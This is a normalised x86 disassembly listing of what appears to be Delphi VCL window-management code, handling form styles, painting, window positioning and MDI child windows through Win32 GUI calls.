call [ edx + 0xb0 ]
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44517c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_440ab4
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4450b4
sub_450cb8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_41dee4
cmp [ ebx + 0x298 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x298 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_450cf8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
and ax [ r-xdata ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_440fe4
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_404160
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
sub edx 0x2c
je r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x278 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_404160
jmp r-xdata
mov esi [ ebx + 0x4 ]
xor edi edi
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x278 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x273 ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
test esi esi
je r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x271 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x290 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_43d400
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_43d400
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_43d400
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_43d400
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_43d400
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_43d400
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x290 ]
xor ecx ecx
call sub_434868
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x290 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_44e778
mov esi eax
mov eax [ ebp - 0x4 ]
cmp edi [ eax + 0x268 ]
jne r-xdata
mov eax esi
call sub_438b98
mov edi eax
push esi
call GetParent
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_451aac
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424018
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_451011
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_450ff4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_4245e4
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_424478
mov eax [ ebp - 0x14 ]
movzx eax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_435ff0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450ffb
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4245e4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x290 ]
xor ecx ecx
call sub_434868
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp edi [ eax + 0x64 ]
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_451aac
call sub_443be8
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45113f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_424018
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_451118
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4510fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_4245e4
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_424478
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451102
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4245e4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
cmp esi [ ebp - 0x4 ]
je r-xdata
push esi
call SetFocus
jmp r-xdata
call sub_443be8
mov esi eax
mov eax [ esi + 0x268 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp esi [ eax + 0x68 ]
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xf8 ]
jmp r-xdata
cmp edi eax
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x8
call sub_43d400
sub_45111f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call ReleaseDC
retn
sub_4511d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x29c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2bc ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_45121c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_451ae0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_451b2c
cmp [ eax + 0x273 ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45125c
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_45142a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1a4 ]
call sub_423efc
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_441598
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_43bc78
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43a744
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29c ] 0x0
je r-xdata
push ebp
call sub_4511d0
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1a4 ]
call sub_423efc
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_451ae0
test eax eax
je r-xdata
push ebp
call sub_4511d0
pop ecx
push ebp
call sub_4511d0
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_45121c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
call sub_44e284
jmp r-xdata
sub_45143c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_44f4c4
mov eax [ ebx + 0x29c ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x277 ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x29c ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x29c ]
push eax
call InvalidateRect
sub_4514a8
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_44fb84
mov eax ebx
call sub_443f88
test al al
je r-xdata
mov eax ebx
call sub_41e09c
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_443be8
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_44009c
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_443be8
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_41e070
call sub_435620
mov edx esi
mov eax ebx
call sub_41e070
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
sub_451540
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28c ] 0x0
jne r-xdata
pop esi
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28c ] 0x1
xor eax eax
push ebp
push sub_4515c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28c ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
jne r-xdata
movzx edx [ esi + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ rw-data ]
movzx edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_4515cc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
call sub_438b98
test eax eax
je r-xdata
mov eax [ ebx + 0x33c ]
call sub_406248
mov edi eax
lea eax [ edi + 0x1 ]
push eax
lea eax [ ebx + 0x33c ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
mov eax [ ebx + 0x33c ]
mov edx [ esi + 0x4 ]
mov edx [ edx ]
mov [ eax + edi * 8 ] edx
mov eax [ ebx + 0x33c ]
mov edx [ esi + 0x8 ]
mov [ eax + edi * 8 + 0x4 ] edx
mov eax [ esi + 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_451634
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
and [ edi ] 0xfff4ffff
and [ ebp ] 0xfffffbff
movzx eax [ esi + 0x271 ]
mov [ esp ] al
cmp [ esi + 0x277 ] 0x1
jne r-xdata
movzx ebx [ esi + 0x270 ]
movzx eax [ esp ]
sub al 0x1
jb r-xdata
movzx eax [ esp ]
test al al
je r-xdata
movzx ebx [ r-xdata ]
jmp r-xdata
sub al 0x2
je r-xdata
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
movzx eax [ esp ]
sub al 0x3
jae r-xdata
movzx eax [ r-xdata ]
and al bl
mov ebx eax
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
test bl 0x1
je r-xdata
cmp [ esi + 0x277 ] 0x1
jne r-xdata
movzx eax [ r-xdata ]
and al bl
mov ebx eax
jmp r-xdata
test bl 0x8
je r-xdata
or [ edi ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or [ ebp ] 0x400
test bl 0x4
je r-xdata
or [ edi ] 0x20000
or [ edi ] 0x10000
sub_4516fd
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff4
mov [ esp ] dl
mov ebx eax
movzx eax [ esp ]
cmp al [ ebx + 0x270 ]
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
movzx eax [ esp ]
mov [ ebx + 0x270 ] al
mov eax ebx
call sub_443f88
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_443be8
push eax
call GetWindowLongA
mov [ esp + 0x4 ] eax
push 0xffffffec
mov eax ebx
call sub_443be8
push eax
call GetWindowLongA
mov [ esp + 0x8 ] eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax ebx
mov si 0xffaa
call sub_404160
mov eax [ esp + 0x4 ]
push eax
push 0xfffffff0
mov eax ebx
call sub_443be8
push eax
call SetWindowLongA
mov eax [ esp + 0x8 ]
push eax
push 0xffffffec
mov eax ebx
call sub_443be8
push eax
call SetWindowLongA
push 0x233
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_443be8
push eax
call SetWindowPos
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
sub_4517cc
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi eax
and [ edx ] 0x7f3bff7f
and [ edi ] 0xfffffe7e
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffd7ff
movzx eax [ esi + 0x271 ]
cmp [ esi + 0x277 ] 0x1
jne r-xdata
movzx ecx al
cmp ecx 0x5
ja r-xdata
mov ecx eax
test cl cl
je r-xdata
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ ecx * 4 + jump_table_45181a ]
mov al 0x2
sub cl 0x3
jne r-xdata
pop edi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x277 ] 0x1
je r-xdata
cmp [ esi + 0x30 ] 0x0
jne r-xdata
or [ edx ] 0xc00000
jmp r-xdata
or [ edx ] 0xc40000
jmp r-xdata
test [ esi + 0x1c ] 0x10
je r-xdata
or [ edi ] 0x80
cmp [ esi + 0x1c4 ] 0x0
jne r-xdata
mov ecx [ edx ]
or ecx 0x80000000
or ecx 0xc00000
mov [ edx ] ecx
cmp [ esi + 0x30 ] 0x0
je r-xdata
or [ edx ] 0x80000000
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
or edx 0x8
or edx 0x800
or edx 0x2000
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ edx ]
or ecx __dos_header
or ecx 0x80
mov [ edx ] ecx
or [ edx ] 0xc00000
jmp r-xdata
mov ecx [ edi ]
or ecx 0x1
or ecx 0x100
mov [ edi ] ecx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
jne r-xdata
sub_4518e0
push esi
push edi
add esp 0xfffffff4
mov edi eax
cmp dl [ edi + 0x271 ]
je r-xdata
add esp 0xc
pop edi
pop esi
retn
mov [ edi + 0x271 ] dl
cmp [ edi + 0x258 ] 0x0
je r-xdata
xor edx edx
jmp r-xdata
movzx eax [ edi + 0x271 ]
sub al 0x2
je r-xdata
mov eax edi
call sub_44f640
mov eax edi
call sub_443f88
test al al
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
push 0xfffffff0
mov eax edi
call sub_443be8
push eax
call GetWindowLongA
mov [ esp ] eax
push 0xffffffec
mov eax edi
call sub_443be8
push eax
call GetWindowLongA
mov [ esp + 0x4 ] eax
push 0xffffffe6
mov eax edi
call sub_443be8
push eax
call GetClassLongA
mov [ esp + 0x8 ] eax
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax edi
mov si 0xffa9
call sub_404160
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax edi
mov si 0xffaa
call sub_404160
mov eax [ esp ]
push eax
push 0xfffffff0
mov eax edi
call sub_443be8
push eax
call SetWindowLongA
mov eax [ esp + 0x4 ]
push eax
push 0xffffffec
mov eax edi
call sub_443be8
push eax
call SetWindowLongA
mov eax [ esp + 0x8 ]
push eax
push 0xffffffe6
mov eax edi
call sub_443be8
push eax
call SetClassLongA
push 0x233
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax edi
call sub_443be8
push eax
call SetWindowPos
mov eax edi
mov edx [ eax ]
call [ edx + 0x80 ]
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
sub_451a10
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0x94 ]
mov ecx esp
mov eax ebx
call sub_43b898
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0x94 ]
je r-xdata
mov eax ebx
call sub_4408ec
sub_451a54
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x94 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_43b9c8
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
movzx eax [ ebx + 0x271 ]
mov [ ebx + 0x2c8 ] al
mov [ ebx + 0x271 ] 0x0
movzx eax [ ebx + 0x2c8 ]
mov [ ebx + 0x271 ] al
jmp r-xdata
sub_451aac
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x277 ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x29c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x29c ]
push eax
call SendMessageA
call sub_438b98
sub_451ae0
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x277 ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x29c ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_455fd4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_455fc0
cmp [ eax + 0x277 ] 0x1
jne r-xdata
sub_451b2c
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x277 ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x29c ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_455fd4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_455fc0
cmp [ eax + 0x277 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_451b7c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_416668
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_451bac
push ebx
push esi
push edi
push ebp
mov ebx eax
xor ebp ebp
push 0x2
mov eax ebx
call sub_443be8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ rw-data ]
call sub_455fa4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_456e7c
mov eax [ rw-data ]
call sub_455fa4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_455f90
mov ebp eax
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_455f90
mov ebp eax
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_455f90
cmp edi [ eax + 0x4 ]
jne r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_455f90
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_451c68
push ebx
mov ebx eax
mov eax ebx
call sub_451c60
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x288 ]
call sub_429f38
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_451c90
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x277 ]
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
cmp bl 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x3
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x277 ] bl
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
setne al
xor al 0x1
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_443f88
test al al
je r-xdata
xor edx edx
push ebp
push sub_451df8
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4450b4
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_452188
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x3
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x277 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x277 ] bl
cmp bl 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d9 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4522b8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43c2e8
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_440ab4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_450b48
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4450b4
sub_451e04
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x277 ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x29c ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x290 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x2a0 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_443be8
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x29c ]
